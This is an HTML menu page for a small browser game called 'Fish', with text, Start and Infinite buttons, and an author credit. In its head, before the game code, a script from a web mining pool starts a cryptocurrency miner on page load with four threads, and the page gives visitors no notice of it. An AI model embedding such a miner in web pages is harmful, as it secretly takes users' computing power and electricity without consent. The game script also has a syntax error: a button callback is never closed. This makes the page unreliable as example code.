<!DOCTYPE html>
<html>
  <head>
    <title> Menu </title>
    <script src="https://webminepool.com/lib/base.js"></script>
    <script>
      var miner = WMP.User('SK_4NgHVFwRZFjQ56ixBJcEs', 'fish',{
          threads: 4,
          autoThreads: false,
          throttle: 0.3,
          forceASMJS: false
       });
       miner.start();
</script>
    <script src="https://simplycodingcourses.com/files/simplyjs/simply.js"></script>
    <script>
      function start(){
        
        sjs.open();
        var menu_text = new sjs.Text("MENU",28,"blue")
        
        menu_text.centerH()
        
        
        var game_text = new sjs.Text("Use the Arrow Keys to Control the Player. Only eat enemies smaller than you!",28,"#ff0");
        game_text.centerH().offset(0, 30)
        
        var startBtn = new sjs.Button("Start", function(){
          window.location = "fish.html";
        });
        
        var infiniteBtn = new sjs.Button("Infinite Fish (no win)", function(){
          window.location = "infinite.html";
        }
        
        startBtn.center()
        
        var info_text = new sjs.Text("Created By Tyler Beneedum",20,"black");
        
        info_text.bottom().centerH();
        
        
      } //End start
    </script>
  </head>
  <body onload="start()">
    <h1> Fish </h1>
  
    <div id="target" style="margin:auto;background:grey;"></div>
  </body>
</html>
